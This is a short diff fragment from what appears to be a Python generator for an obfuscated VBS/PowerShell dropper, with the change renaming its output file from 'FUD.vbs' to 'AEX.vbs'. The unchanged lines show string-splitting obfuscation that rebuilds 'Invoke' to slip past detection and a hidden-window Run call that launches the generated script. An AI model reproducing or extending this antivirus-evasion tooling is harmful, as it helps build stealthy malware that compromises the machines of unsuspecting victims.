@@ -127,7 +127,7 @@ try:
                   "<##>('In" + confuse['V'] + "oke'.replace('" + confuse['V'] + "','v'))($Null,$Null)<##>;\"  \n\n" \
                   "" + confuse['obj'] + ".Run " + confuse['sync'] + ", 0, False"
     try:
-        fud = open('FUD.vbs', 'w')
+        fud = open('AEX.vbs', 'w')
         fud.write(power_shell)
         fud.close()
         #loading()
